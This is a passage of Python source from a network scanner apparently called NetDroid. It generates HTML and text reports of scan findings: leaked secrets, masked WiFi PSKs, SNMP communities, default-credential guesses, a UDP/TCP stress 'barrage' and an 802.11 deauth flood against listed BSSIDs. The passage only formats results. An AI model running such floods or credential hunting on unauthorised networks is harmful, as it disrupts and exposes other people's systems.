              <p class="didatica-intro">📖 <strong>Como ler esta seção:</strong> cada linha é uma falha potencial detectada por banner/regex. Severidades vão de <span class="badge sev-info">INFO</span> a <span class="badge sev-critica">CRÍTICA</span>. Nenhum exploit foi executado — são <em>indícios</em> que precisam ser confirmados. Veja explicações abaixo:</p>
              {blocos_sev}
            </div>
            <div class="table-wrap"><table><tr><th>IP</th><th>Porta</th><th>Serviço</th><th>Severidade</th><th>Dica/CVE</th><th>Verificada</th></tr>
            {vuln_rows}</table></div></div>"""

        # ── Credential & Secret Hunting (passivo) ──────────────
        leak_rows = ""
        psk_rows = ""
        snmp_rows = ""
        cred_sug_rows = ""
        total_leaks = total_psks = total_snmp_extra = 0
        for h in self.hosts:
            for leak in h.get("secret_leaks", []) or []:
                total_leaks += 1
                tipos = ", ".join(a["tipo"] for a in leak.get("achados", []))
                trechos = " | ".join(html.escape(a["trecho"]) for a in leak.get("achados", []))
                leak_rows += (
                    f"<tr class='sev-critica'><td>{html.escape(h['ip'])}</td>"
                    f"<td>{html.escape(leak.get('path', ''))}</td>"
                    f"<td>{leak.get('status', '?')}</td>"
                    f"<td><span class='badge sev-critica'>{html.escape(tipos)}</span></td>"
                    f"<td class='meta'>{trechos[:200]}</td></tr>"
                )
            for psk in h.get("psk_leaks", []) or []:
                total_psks += 1
                # Mascarar PSK: mostrar 3 primeiros e 2 últimos chars
                p = psk.get("psk", "")
                p_mask = (p[:3] + "*" * max(0, len(p) - 5) + p[-2:]) if len(p) > 5 else "*****"
                psk_rows += (
                    f"<tr class='sev-critica'><td>{html.escape(h['ip'])}</td>"
                    f"<td>{psk.get('port', '?')}</td>"
                    f"<td>{html.escape(psk.get('tipo', ''))}</td>"
                    f"<td><code>{html.escape(p_mask)}</code></td>"
                    f"<td>{len(p)}</td></tr>"
                )
            for snmp in h.get("snmp_creds", []) or []:
                comm = snmp.get("community", "")
                if comm and comm != "public":
                    total_snmp_extra += 1
                snmp_rows += (
                    f"<tr><td>{html.escape(h['ip'])}</td>"
                    f"<td><span class='badge sev-{'critica' if comm != 'public' else 'media'}'>"
                    f"{html.escape(comm)}</span></td>"
                    f"<td>{html.escape(snmp.get('sys_descr', '')[:80])}</td></tr>"
                )
            for sug in h.get("creds_padrao_sugeridas", []) or []:
                cred_sug_rows += (
                    f"<tr><td>{html.escape(h['ip'])}</td>"
                    f"<td>{html.escape(sug.get('vendor_detectado', '?'))}</td>"
                    f"<td>{html.escape(sug.get('fonte', '?'))}</td>"
                    f"<td class='meta'>{html.escape(', '.join(sug.get('pares', [])[:6]))}</td></tr>"
                )

        cred_section = ""
        if leak_rows or psk_rows or snmp_rows or cred_sug_rows:
            partes = []
            partes.append(f"<p class='meta'>Segredos confirmados: {total_leaks} | "
                          f"PSKs WiFi expostas: {total_psks} | "
                          f"SNMP communities além de public: {total_snmp_extra}</p>")
            partes.append(
                "<p class='didatica-intro'>📖 <strong>Como ler esta seção:</strong> "
                "esta caça é 100% passiva — apenas lemos o que o servidor entrega "
                "publicamente. Não tentamos login. Cada subtipo abaixo tem "
                "explicação detalhada do que significa, como confirmar manualmente "
                "e qual o impacto real.</p>")
            if leak_rows:
                # Pega primeiro tipo encontrado como exemplo
                exemplo_leak = ""
                for h in self.hosts:
                    for lk in h.get("secret_leaks", []) or []:
                        if lk.get("achados"):
                            exemplo_leak = (f"{h['ip']}{lk.get('path', '')} → "
                                            f"{lk['achados'][0].get('tipo', '')}")
                            break
                    if exemplo_leak: break
                partes.append("<h3>Vazamentos confirmados (LEAK_PATTERNS)</h3>")
                partes.append(self._explicacao_html("secret_leak", exemplo_leak))
                partes.append(
                    "<div class='table-wrap'><table>"
                    "<tr><th>IP</th><th>Path</th><th>Status</th><th>Tipo</th><th>Trecho</th></tr>"
                    f"{leak_rows}</table></div>")
            if psk_rows:
                exemplo_psk = ""
                for h in self.hosts:
                    for psk in h.get("psk_leaks", []) or []:
                        p = psk.get("psk", "")
                        masc = (p[:3] + "***" + p[-2:]) if len(p) > 5 else "*****"
                        exemplo_psk = f"{h['ip']} → PSK {masc} (origem: {psk.get('tipo', '?')})"
                        break
                    if exemplo_psk: break
                partes.append("<h3>PSK WiFi expostas em JS/HTML</h3>")
                partes.append(self._explicacao_html("psk_exposto", exemplo_psk))
                partes.append(
                    "<div class='table-wrap'><table>"
                    "<tr><th>IP</th><th>Porta</th><th>Origem</th><th>PSK (mascarada)</th><th>Tam.</th></tr>"
                    f"{psk_rows}</table></div>")
            if snmp_rows:
                exemplo_snmp = ""
                for h in self.hosts:
                    for snmp in h.get("snmp_creds", []) or []:
                        exemplo_snmp = (f"{h['ip']} aceitou community "
                                        f"'{snmp.get('community', '')}' → "
                                        f"{snmp.get('sys_descr', '')[:60]}")
                        break
                    if exemplo_snmp: break
                # Decide qual explicação usar
                tem_extra = any(
                    s.get("community") != "public"
                    for h in self.hosts
                    for s in (h.get("snmp_creds", []) or []))
                partes.append("<h3>SNMP — comunidades aceitas</h3>")
                partes.append(self._explicacao_html(
                    "snmp_community_extra" if tem_extra else "porta_snmp",
                    exemplo_snmp))
                partes.append(
                    "<div class='table-wrap'><table>"
                    "<tr><th>IP</th><th>Community</th><th>sysDescr</th></tr>"
                    f"{snmp_rows}</table></div>")
            if cred_sug_rows:
                exemplo_creds = ""
                for h in self.hosts:
                    for sug in h.get("creds_padrao_sugeridas", []) or []:
                        exemplo_creds = (f"{h['ip']} ({sug.get('vendor_detectado', '')}) → "
                                         f"{', '.join(sug.get('pares', [])[:3])}")
                        break
                    if exemplo_creds: break
                partes.append("<h3>Credenciais padrão prováveis (por modelo)</h3>")
                partes.append(self._explicacao_html("creds_padrao", exemplo_creds))
                partes.append(
                    "<div class='table-wrap'><table>"
                    "<tr><th>IP</th><th>Vendor</th><th>Fonte</th><th>Pares prováveis (user:pass)</th></tr>"
                    f"{cred_sug_rows}</table></div>")
            cred_section = ('<div class="card"><h2>Credential & Secret Hunting (passivo)</h2>'
                            + "".join(partes) + "</div>")

        risk_rows = "".join(
            f"<tr><td>{html.escape(r['ip'])}</td><td>{r['score']}</td><td>{html.escape(r['severity'])}</td>"
            f"<td>{html.escape('; '.join(r.get('issues', [])[:3]))}</td></tr>"
            for r in risks[:40]
        )
        risk_section = ""
        if risk_rows:
            # Coleta tipos únicos de issues vistos para mostrar didática só do relevante
            tipos_vistos: Set[str] = set()
            for r in risks:
                for issue in r.get("issues", []):
                    chave = self._classificar_finding_para_explicacao(issue)
                    if chave:
                        tipos_vistos.add(chave)
            blocos_tipos = "".join(self._explicacao_html(c) for c in sorted(tipos_vistos))
            risk_section = f"""<div class="card"><h2>Risk Findings — Pontuação Consolidada por Host</h2>
            <div class="didatica-wrap">
              <p class="didatica-intro">📖 <strong>Como ler:</strong> cada host recebe um score 0–100 calculado somando os achados encontrados (Telnet exposto, SMB ativo, vulns, leaks, etc.). Severity vai de <em>low</em> (&lt;30) a <em>high</em> (&ge;60). Abaixo, cada tipo de issue que apareceu nesta varredura está explicado:</p>
              {blocos_tipos}
            </div>
            <div class="table-wrap"><table><tr><th>IP</th><th>Score</th><th>Severity</th><th>Issues</th></tr>
            {risk_rows}</table></div></div>"""

        godfall_section = ""
        if godfall:
            per_host = godfall.get("per_host", [])
            phases = godfall.get("phases", [])
            aborted = bool(godfall.get("aborted", False))
            abort_reason = str(godfall.get("abort_reason", "") or "")
            recovery = godfall.get("recovery", {}) or {}
            rec_txt = "recovered" if recovery.get("recovered") else "not recovered"
            rec_s = recovery.get("seconds", 0)
            phase_rows = "".join(
                f"<tr><td>{html.escape(p['name'])}</td><td>{p['attempts_per_host']}</td><td>{p['concurrency']}</td>"
                f"<td>{p['delay_ms']}ms</td><td>{p['latency_snapshot_ms']}ms</td>"
                f"<td>{p.get('success_rate_pct', 0)}%</td>"
                f"<td>tier {p.get('barrage_tier', 0)}</td>"
                f"<td>{p.get('barrage_packets', 0):,}</td></tr>"
                for p in phases
            )
            pf_rows = "".join(
                f"<tr><td>{html.escape(h['ip'])}</td><td>{h['attempts']}</td><td>{h['success_rate']}%</td>"
                f"<td>{h['avg_rps']}</td></tr>" for h in per_host[:30]
            )
            modo_godfall = godfall.get("modo", "fases")
            barrage_total = godfall.get("barrage_packets_total", 0)
            iperf_meta = godfall.get("baseline_iperf", {}) or {}
            iperf_linha = ""
            if iperf_meta:
                tcp = iperf_meta.get("tcp", {}) or {}
                udp = iperf_meta.get("udp", {}) or {}
                tcp_mbps = (tcp.get("sum_sent", {}).get("bits_per_second", 0) or 0) / 1e6
                udp_mbps = (udp.get("sum", {}).get("bits_per_second", 0) or 0) / 1e6
                udp_jit = (udp.get("sum", {}).get("jitter_ms", 0) or 0)
                udp_loss = (udp.get("sum", {}).get("lost_percent", 0) or 0)
                iperf_linha = (f"<p class='meta'>Baseline iperf3: TCP {tcp_mbps:.1f} Mbps | "
                               f"UDP {udp_mbps:.1f} Mbps | jitter {udp_jit:.2f}ms | loss {udp_loss:.1f}%</p>")
            exemplo_god = (f"Avg success: {godfall.get('avg_success_rate', 0)}% após "
                           f"{barrage_total:,} pacotes UDP de barragem. "
                           f"Status: {'abortado' if aborted else 'concluído'}.")
            godfall_section = f"""<div class="card"><h2>Godfall Titan Sweep ({html.escape(modo_godfall)})</h2>
            <p class="meta">Hosts: {godfall.get('hosts_tested', 0)} | Attempts/host: {godfall.get('attempts_per_host', 0)} | Avg success: {godfall.get('avg_success_rate', 0)}% | Barrage total: {barrage_total:,} pacotes | {('ABORTADO' if aborted else 'CONCLUÍDO')} | Recovery: {rec_txt} ({rec_s}s)</p>
            {iperf_linha}
            <p class="meta">{html.escape(abort_reason) if aborted else ''}</p>
            <div class="didatica-wrap">
              {self._explicacao_html("godfall_resultado", exemplo_god)}
            </div>
            <div class="table-wrap"><table><tr><th>Fase</th><th>Tent./Host</th><th>Concorrência</th><th>Delay</th><th>Latência</th><th>Sucesso</th><th>Barrage</th><th>Pacotes</th></tr>
            {phase_rows}</table></div>
            <div class="table-wrap"><table><tr><th>IP</th><th>Attempts</th><th>Success</th><th>Req/s</th></tr>
            {pf_rows}</table></div></div>"""

        lat_section = ""
        if lat:
            lat_section = f"""<div class="card"><h2>Latency During Stress</h2>
            <div class="table-wrap"><table><tr><th>Baseline</th><th>Avg</th><th>Min</th><th>Max</th><th>Loss</th></tr>
            <tr><td>{lat.get('baseline_ms',0)}ms</td><td>{lat.get('avg_ms',0)}ms</td>
            <td>{lat.get('min_ms',0)}ms</td><td>{lat.get('max_ms',0)}ms</td>
            <td>{lat.get('packet_loss_pct',0)}%</td></tr></table></div></div>"""

        # ── Card: Privilege Mode ──────────────────────────────
        privilege_section = ""
        if self.ctx_priv and self.ctx_priv.ativo:
            caps = sorted(self.ctx_priv.capabilities)
            caps_html = " ".join(
                f"<span class='badge sev-info'>{html.escape(c)}</span>" for c in caps)
            privilege_section = f"""<div class="card"><h2>Privilege Mode — Apex Militar</h2>
            <p class="meta">Plataforma: <strong>{html.escape(self.ctx_priv.plataforma)}</strong> |
            Motor: <strong>{html.escape(self.ctx_priv.motor)}</strong> |
            Capabilities: {len(caps)}</p>
            <div class="didatica-wrap">{self._explicacao_html("privilegio_root")}</div>
            <p>{caps_html}</p>
            <p class="meta">Boost aplicado em: --discover, --Insane, --god, --godfall.</p>
            </div>"""

        # ── Card: Kamikase Death Toll ─────────────────────────
        kamikase_section = ""
        if self.kamikase.get("ativo"):
            alvos = self.kamikase.get("alvos", [])
            por_bssid = self.kamikase.get("pacotes_por_bssid", {})
            rows = ""
            for a in alvos:
                bssid = a.get("bssid", "?")
                pkts = por_bssid.get(bssid, 0)
                rows += (
                    f"<tr><td>{html.escape(str(a.get('essid', '?')))[:30]}</td>"
                    f"<td>{html.escape(bssid)}</td>"
                    f"<td>{a.get('canal', '?')}</td>"
                    f"<td>{a.get('rssi', '?')}</td>"
                    f"<td>{pkts:,}</td></tr>"
                )
            duracao = self.kamikase.get("duracao_s", 0)
            total = self.kamikase.get("total_pacotes", 0)
            pps_medio = int(total / duracao) if duracao > 0 else 0
            kamikase_section = f"""<div class="card"><h2>⚡ Kamikase Death Toll ⚡</h2>
            <p class="meta">Total: <strong>{total:,}</strong> pacotes |
            Duração: <strong>{duracao:.1f}s</strong> |
            PPS médio: <strong>{pps_medio:,}</strong> |
            BSSIDs atacados: <strong>{len(alvos)}</strong> |
            Motivo do encerramento: {html.escape(self.kamikase.get('motivo_encerramento', 'n/a'))}</p>
            <p class="meta">Audit log: <code>{html.escape(self.kamikase.get('audit_log', '?'))}</code></p>
            <div class="didatica-wrap">{self._explicacao_html("kamikase")}</div>
            <div class="table-wrap"><table>
            <tr><th>ESSID</th><th>BSSID</th><th>Canal</th><th>RSSI</th><th>Pacotes</th></tr>
            {rows}</table></div></div>"""

        topo_svg = self._generate_topology_svg()
        content = f"""<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>NetDroid Report - {html.escape(self.det.ssid or 'Scan')}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}} body{{background:#0a0a0a;color:#fff;font-family:'Courier New',monospace}}
.wrap{{max-width:1200px;margin:0 auto;padding:16px}} h1{{color:#cc0000;text-align:center;font-size:clamp(1.4rem,2.5vw,2rem);margin:12px 0 18px}}
h2{{color:#cc0000;margin:10px 0 12px;font-size:clamp(1rem,2vw,1.2rem)}} .meta{{color:#999;text-align:center;font-size:.86rem;margin:8px 0 12px}}
.stats{{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin:10px 0 14px}}
.stat{{background:#121212;border:1px solid #2b2b2b;border-radius:8px;padding:10px;text-align:center}} .val{{font-size:1.45rem;color:#00ff9f;font-weight:700}}
.lbl{{font-size:.75rem;color:#a6a6a6}} .card{{background:#111;border:1px solid #2a2a2a;border-radius:8px;padding:14px;margin:12px 0}}
.topo{{text-align:center;margin:12px 0 6px}} .table-wrap{{overflow:auto;max-width:100%}} table{{width:100%;border-collapse:collapse;min-width:980px}}
th{{background:#1a0000;color:#cc0000;padding:8px;text-align:left;border-bottom:2px solid #cc0000}} td{{padding:7px 8px;border-bottom:1px solid #242424;vertical-align:top}}
tr:hover{{background:#171717}}
.badge{{display:inline-block;padding:2px 7px;border-radius:10px;font-size:.72rem;background:#222;color:#ddd;border:1px solid #333}}
.badge.tipo-roteador{{background:#06223e;color:#5fbcff;border-color:#0e4f8e}}
.badge.tipo-camera_ip{{background:#3e0606;color:#ff6c6c;border-color:#8e0e0e}}
.badge.tipo-impressora{{background:#3a3a06;color:#ffe05e;border-color:#7e7e0e}}
.badge.tipo-windows_pc{{background:#1c2a3a;color:#9ad0ff;border-color:#3a5a82}}
.badge.tipo-linux_servidor{{background:#063e1a;color:#5fff9f;border-color:#0e8e3a}}
.badge.tipo-mobile{{background:#3a063e;color:#ff9af0;border-color:#7e0e8e}}
.badge.tipo-iot_generico{{background:#3e2a06;color:#ffb35e;border-color:#8e5e0e}}
.badge.tipo-nas{{background:#063e3a;color:#5fffe0;border-color:#0e8e7e}}
.badge.tipo-voip{{background:#2a063e;color:#c89aff;border-color:#5e0e8e}}
.badge.tipo-desconhecido{{background:#222;color:#888}}
.badge.sev-critica{{background:#3e0606;color:#ff4d4d;border-color:#cc0000}}
.badge.sev-alta{{background:#3a1c06;color:#ff9d4d;border-color:#a35200}}
.badge.sev-media{{background:#3a3206;color:#ffe05e;border-color:#a37700}}
.badge.sev-info{{background:#06283e;color:#5fbcff;border-color:#0e4f8e}}
tr.sev-critica td:first-child{{border-left:3px solid #cc0000}}
tr.sev-alta td:first-child{{border-left:3px solid #cc7000}}
.didatica-wrap{{margin:8px 0 14px;padding:10px 12px;background:#0c1418;border-left:3px solid #00d4ff;border-radius:6px}}
.didatica-intro{{color:#9ad0ff;font-size:.86rem;margin:4px 0 8px;line-height:1.45}}
.didatica-intro em{{color:#fdee00;font-style:normal}}
details.didatica{{margin:6px 0;padding:6px 10px;background:#101820;border:1px solid #1f2e3a;border-radius:5px;cursor:pointer}}
details.didatica summary{{color:#00d4ff;font-weight:600;font-size:.84rem;list-style:none;outline:none}}
details.didatica summary::-webkit-details-marker{{display:none}}
details.didatica summary::before{{content:"▶ ";color:#bc13fe;font-size:.7rem}}
details.didatica[open] summary::before{{content:"▼ "}}
details.didatica p{{margin:6px 0;color:#cfd8dc;font-size:.82rem;line-height:1.5}}
details.didatica strong{{color:#00ff9f}}
details.didatica code{{background:#000;color:#fdee00;padding:2px 6px;border-radius:3px;font-size:.78rem}}
@media (max-width:700px){{.wrap{{padding:10px}} .card{{padding:10px}} table{{min-width:780px}}}}
</style></head><body><div class="wrap">
<h1>NetDroid Report</h1>
<p class="meta">SSID: {html.escape(self.det.ssid or 'N/A')} | Gateway: {html.escape(self.det.gateway or 'N/A')} | Subnet: {html.escape(self.det.subnet or 'N/A')} | {self.timestamp.strftime('%Y-%m-%d %H:%M')}</p>
<div class="stats">
<div class="stat"><div class="val">{len(self.hosts)}</div><div class="lbl">Hosts</div></div>
<div class="stat"><div class="val">{open_ports}</div><div class="lbl">Portas Abertas</div></div>
<div class="stat"><div class="val">{total_vulns}</div><div class="lbl">Vulnerabilidades</div></div>
<div class="stat"><div class="val">{total_leaks}</div><div class="lbl">Segredos</div></div>
<div class="stat"><div class="val">{total_psks}</div><div class="lbl">PSKs</div></div>
<div class="stat"><div class="val">{len(risks)}</div><div class="lbl">Riscos</div></div>
</div>
<div class="topo">{topo_svg}</div>
<div class="card"><h2>Inventário de Hosts (Inteligência Total)</h2>
<div class="didatica-wrap">{self._explicacao_html("inventario_hosts")}</div>
<div class="table-wrap"><table><tr><th>IP</th><th>Hostname</th><th>Tipo</th><th>MAC</th><th>Vendor</th><th>OS</th><th>Portas</th><th>Serviços</th><th>Web</th><th>Conf.</th><th>Risk</th><th>Fontes</th></tr>{hosts_rows}</table></div></div>
{privilege_section}{vuln_section}{cred_section}{risk_section}{godfall_section}{kamikase_section}{lat_section}
<p class="meta">NetDroid v{VERSION} — gerado automaticamente</p>
</div></body></html>"""
        path.write_text(content, encoding="utf-8")

    def _generate_topology_svg(self) -> str:
        n = len(self.hosts)
        if n == 0:
            return ""
        w, h = 600, 400
        cx, cy = w // 2, h // 2
        nodes = []
        for i, host in enumerate(self.hosts[:20]):
            angle = (2 * math.pi * i) / min(n, 20)
            r = 150
            x = cx + r * math.cos(angle)
            y = cy + r * math.sin(angle)
            color = "#00ff41" if not host.get("is_gateway") else "#cc0000"
            label = host["ip"].split(".")[-1]
            nodes.append(f'<line x1="{cx}" y1="{cy}" x2="{x:.0f}" y2="{y:.0f}" '
                         f'stroke="#333" stroke-width="1"/>')
            nodes.append(f'<circle cx="{x:.0f}" cy="{y:.0f}" r="8" fill="{color}"/>')
            nodes.append(f'<text x="{x:.0f}" y="{y + 20:.0f}" fill="#888" '
                         f'font-size="10" text-anchor="middle">.{label}</text>')
        gw_node = (f'<circle cx="{cx}" cy="{cy}" r="15" fill="#cc0000" '
                   f'stroke="#ff0000" stroke-width="2"/>'
                   f'<text x="{cx}" y="{cy + 30}" fill="#cc0000" '
                   f'font-size="11" text-anchor="middle">Gateway</text>')
        return (f'<svg width="{w}" height="{h}" xmlns="http://www.w3.org/2000/svg">'
                f'{"".join(nodes)}{gw_node}</svg>')

    def _write_txt(self, path: Path):
        risks = self.god.get("risks", [])
        risk_map = {r["ip"]: r for r in risks}
        godfall = self.stress.get("godfall", {})
        total_vulns = sum(len(h.get("vulns", []) or []) for h in self.hosts)
        lines = [
            f"{'=' * 64}",
            f"  NetDroid v{VERSION} — Resumo Executivo",
            f"  {self.timestamp.strftime('%Y-%m-%d %H:%M')}",
            f"{'=' * 64}",
            f"  SSID:    {self.det.ssid or 'N/A'}",
            f"  Gateway: {self.det.gateway or 'N/A'}",
            f"  Subnet:  {self.det.subnet or 'N/A'}",
            f"  Hosts:   {len(self.hosts)}",
            f"  Vulns:   {total_vulns}",
            f"  Riscos:  {len(risks)}",
            f"{'-' * 64}",
        ]
        for h in self.hosts:
            gw = " [GATEWAY]" if h.get("is_gateway") else ""
            ports = ", ".join(str(p) for p in h.get("ports", [])[:10])
            hostname = h.get("hostname", "") or "—"
            tipo = h.get("device_type", "desconhecido")
            fontes = ", ".join(h.get("fontes", [])) or "—"
            lines.append(f"  {h['ip']}{gw}")
            lines.append(f"    Hostname: {hostname}  |  Tipo: {tipo}")
            lines.append(f"    MAC: {h.get('mac', 'N/A')} | {h.get('vendor', '?')} | {h.get('os', '?')}")
            lines.append(f"    Fontes: {fontes}")
            if ports:
                lines.append(f"    Portas: {ports}")
            for w in h.get("web_info", []):
                lines.append(f"    Web: {w.get('title', '')} [{w.get('server', '')}]")
            for v in (h.get("vulns", []) or [])[:5]:
                lines.append(f"    Vuln [{v.get('severidade', 'info').upper()}] "
                             f"porta {v.get('porta', '?')}: {v.get('dica_cve', '')[:90]}")
            for leak in (h.get("secret_leaks", []) or [])[:3]:
                tipos = ", ".join(a["tipo"] for a in leak.get("achados", []))
                lines.append(f"    LEAK {leak.get('path', '?')} → {tipos}")
            for psk in (h.get("psk_leaks", []) or [])[:2]:
                p = psk.get("psk", "")
                masc = (p[:3] + "*" * max(0, len(p) - 5) + p[-2:]) if len(p) > 5 else "*****"
                lines.append(f"    PSK exposta porta {psk.get('port', '?')}: {masc}")
            for snmp in (h.get("snmp_creds", []) or [])[:2]:
                lines.append(f"    SNMP community '{snmp.get('community', '')}' aceita")
            risk = risk_map.get(h["ip"])
            if risk:
                lines.append(f"    Risk: {risk.get('score', 0)} ({risk.get('severity', 'low')})")
                lines.append(f"    Issues: {'; '.join(risk.get('issues', [])[:3])}")

        if total_vulns:
            lines.append(f"\n{'-' * 64}")
            lines.append("  === VULNERABILIDADES ===")
            lines.append("  📖 Como ler: cada linha é um INDÍCIO detectado por banner/")
            lines.append("     regex. Severidade vai de [INFO] a [CRITICA]. Veja o glossário")
            lines.append("     no final do arquivo para entender o impacto de cada nível.")
            lines.append("")
            for h in self.hosts:
                for v in (h.get("vulns", []) or [])[:10]:
                    lines.append(f"  - {h['ip']}:{v.get('porta', '?')} "
                                 f"[{v.get('severidade', 'info').upper()}] "
                                 f"{v.get('dica_cve', '')[:90]}")

        # ── Credential & Secret Hunting ──────────────────────
        leaks_total = sum(len(h.get("secret_leaks", []) or []) for h in self.hosts)
        psks_total = sum(len(h.get("psk_leaks", []) or []) for h in self.hosts)
        snmp_total = sum(len(h.get("snmp_creds", []) or []) for h in self.hosts)
        sug_total = sum(len(h.get("creds_padrao_sugeridas", []) or []) for h in self.hosts)
        if leaks_total or psks_total or snmp_total or sug_total:
            lines.append(f"\n{'-' * 64}")
            lines.append("  === CREDENTIAL & SECRET HUNTING (passivo) ===")
            lines.append("  📖 Como ler: 100% passivo — apenas lemos o que o servidor")
            lines.append("     entrega publicamente. NÃO houve tentativa de login. Cada")
            lines.append("     subtipo abaixo está explicado em detalhes no GLOSSÁRIO.")
            lines.append("")
            lines.append(f"  Segredos: {leaks_total} | PSKs: {psks_total} | "
                         f"SNMP communities: {snmp_total} | Sugestões de creds: {sug_total}")
            if leaks_total:
                lines.append(f"\n  -- Vazamentos confirmados --")
                for h in self.hosts:
                    for leak in (h.get("secret_leaks", []) or []):
                        tipos = ", ".join(a["tipo"] for a in leak.get("achados", []))
                        lines.append(f"  ! {h['ip']}{leak['path']} ({leak.get('status', '?')}) "
                                     f"→ {tipos}")
            if psks_total:
                lines.append(f"\n  -- PSKs WiFi expostas --")
                for h in self.hosts:
                    for psk in (h.get("psk_leaks", []) or []):
                        p = psk.get("psk", "")
                        masc = (p[:3] + "*" * max(0, len(p) - 5) + p[-2:]) if len(p) > 5 else "*****"
                        lines.append(f"  ! {h['ip']}:{psk.get('port', '?')} "
                                     f"[{psk.get('tipo', '')}] → {masc} (len={len(p)})")
            if snmp_total:
                lines.append(f"\n  -- SNMP communities aceitas --")
                for h in self.hosts:
                    for snmp in (h.get("snmp_creds", []) or []):
                        lines.append(f"  - {h['ip']} | community={snmp.get('community', '')} | "
                                     f"{snmp.get('sys_descr', '')[:60]}")
            if sug_total:
                lines.append(f"\n  -- Credenciais padrão prováveis (informativo) --")
                for h in self.hosts:
                    for sug in (h.get("creds_padrao_sugeridas", []) or []):
                        amostras = ", ".join(sug.get("pares", [])[:4])
                        lines.append(f"  - {h['ip']} ({sug.get('vendor_detectado', '?')} "
                                     f"via {sug.get('fonte', '?')}): {amostras}")

        if risks:
            lines.append(f"\n{'-' * 64}")
            lines.append("  === TOP RISCOS ===")
            lines.append("  📖 Como ler: score 0–100 por host (soma dos achados).")
            lines.append("     low (<30) | medium (30–59) | high (60+). O glossário no")
            lines.append("     final explica cada tipo de issue listada.")
            lines.append("")
            for r in risks[:20]:
                lines.append(f"  - {r['ip']} | score={r['score']} | {r['severity']} | "
                             f"{'; '.join(r.get('issues', [])[:2])}")

        if godfall:
            lines.append(f"\n{'-' * 64}")
            lines.append(f"  === GODFALL TITAN SWEEP ({godfall.get('modo', 'fases')}) ===")
            lines.append("  📖 Como ler: benchmark de resiliência em 4 fases progressivas.")
            lines.append("     Cada fase aumenta a carga e dispara uma 'barragem' UDP+TCP")
            lines.append("     em paralelo. Veja explicação completa no GLOSSÁRIO.")
            lines.append("")
            if godfall.get("aborted"):
                lines.append("  Status: ABORTADO")
                lines.append(f"  Motivo: {godfall.get('abort_reason', '')}")
            else:
                lines.append("  Status: CONCLUÍDO")
            rec = godfall.get("recovery", {}) or {}
            lines.append(f"  Recovery: {'sim' if rec.get('recovered') else 'não'} ({rec.get('seconds', 0)}s)")
            lines.append(f"  Barrage total: {godfall.get('barrage_packets_total', 0):,} pacotes UDP")
            iperf = godfall.get("baseline_iperf", {}) or {}
            if iperf:
                tcp = iperf.get("tcp", {}) or {}
                udp = iperf.get("udp", {}) or {}
                tcp_mbps = (tcp.get("sum_sent", {}).get("bits_per_second", 0) or 0) / 1e6
                udp_mbps = (udp.get("sum", {}).get("bits_per_second", 0) or 0) / 1e6
                lines.append(f"  Baseline iperf3: TCP {tcp_mbps:.1f} Mbps | UDP {udp_mbps:.1f} Mbps")
            for p in godfall.get("phases", []):
                lines.append(
                    f"  Fase {p['name']}: tent./host={p['attempts_per_host']} | "
                    f"conc={p['concurrency']} | delay={p['delay_ms']}ms | "
                    f"lat_snap={p['latency_snapshot_ms']}ms | sucesso={p.get('success_rate_pct', 0)}% | "
                    f"barrage tier {p.get('barrage_tier', 0)} ({p.get('barrage_packets', 0):,} pkts)"
                )
            lines.append(f"\n{'-' * 64}")
            lines.append("  === RANKING DE RESILIÊNCIA ===")
            lines.append(f"  Hosts testados: {godfall.get('hosts_tested', 0)}")
            lines.append(f"  Tentativas/host base: {godfall.get('attempts_per_host', 0)}")
            lines.append(f"  Sucesso médio: {godfall.get('avg_success_rate', 0)}%")
            for h in godfall.get("per_host", [])[:20]:
                lines.append(f"  - {h['ip']} | sucesso={h['success_rate']}% | req/s={h['avg_rps']}")

        # ── GLOSSÁRIO E IMPACTO ────────────────────────────────
        # ── Privilege Mode (TXT) ─────────────────────────────
        if self.ctx_priv and self.ctx_priv.ativo:
            lines.append(f"\n{'-' * 64}")
            lines.append(f"  === PRIVILEGE MODE — {self.ctx_priv.motor.upper()} ===")
            lines.append(f"  Plataforma: {self.ctx_priv.plataforma} | "
                         f"Motor: {self.ctx_priv.motor}")
            lines.append(f"  Capabilities ({len(self.ctx_priv.capabilities)}): "
                         f"{', '.join(sorted(self.ctx_priv.capabilities))}")
            lines.append("  📖 Boost aplicado em todas as flags. Veja glossário 'privilegio_root'.")

        # ── Kamikase Death Toll (TXT) ────────────────────────
        if self.kamikase.get("ativo"):
            lines.append(f"\n{'-' * 64}")
            lines.append("  === ⚡ KAMIKASE DEATH TOLL ⚡ ===")
            lines.append("  📖 Deauth flood 802.11 — veja glossário 'kamikase'.")
            lines.append("")
            lines.append(f"  Total: {self.kamikase.get('total_pacotes', 0):,} pacotes")
            lines.append(f"  Duração: {self.kamikase.get('duracao_s', 0):.1f}s")
            lines.append(f"  BSSIDs atacados: {len(self.kamikase.get('alvos', []))}")
            lines.append(f"  Motivo encerramento: {self.kamikase.get('motivo_encerramento', 'n/a')}")
            lines.append(f"  Audit log: {self.kamikase.get('audit_log', '?')}")
            lines.append("")
            for a in self.kamikase.get("alvos", []):
                bssid = a.get("bssid", "?")
                pkts = self.kamikase.get("pacotes_por_bssid", {}).get(bssid, 0)
                lines.append(f"  - {bssid} | {a.get('essid', '?')[:30]:30s} | "
                             f"canal {a.get('canal', '?')} | {pkts:,} pacotes")

        chaves = self._coletar_chaves_explicacao()
        if chaves:
            lines.append(f"\n{'=' * 64}")
            lines.append("  === GLOSSÁRIO E IMPACTO DOS ACHADOS ===")
            lines.append(f"{'=' * 64}")
            lines.append("  Esta seção explica em detalhes cada TIPO de descoberta")
            lines.append("  que apareceu nesta varredura. Use como referência rápida")
            lines.append("  para entender o que cada achado significa, como confirmar")
            lines.append("  manualmente que é real, e qual o impacto na prática.")
            lines.append("")
            for chave in chaves:
                bloco = self._explicacao_txt(chave, indent="  ")
                if bloco:
                    lines.extend(bloco)
                    lines.append("")

        lines.append(f"\n{'=' * 64}")
        lines.append(f"  NetDroid v{VERSION} — gerado automaticamente")
        lines.append(f"{'=' * 64}")
        path.write_text("\n".join(lines), encoding="utf-8")


# ═══════════════════ UPGRADER ═════════════════════════════════

class Upgrader:
    """Auto-update via GitHub (yamotoz/NetDroid) com retry e validação."""

    def __init__(self, ui: TerminalUI):
        self.ui = ui

    # Busca uma URL com até 3 tentativas e backoff curto
    def _fetch(self, url: str, timeout: int = 20, tentativas: int = 3,
                 silencioso: bool = False) -> Optional[str]:
        if not HAS_REQUESTS:
            return None
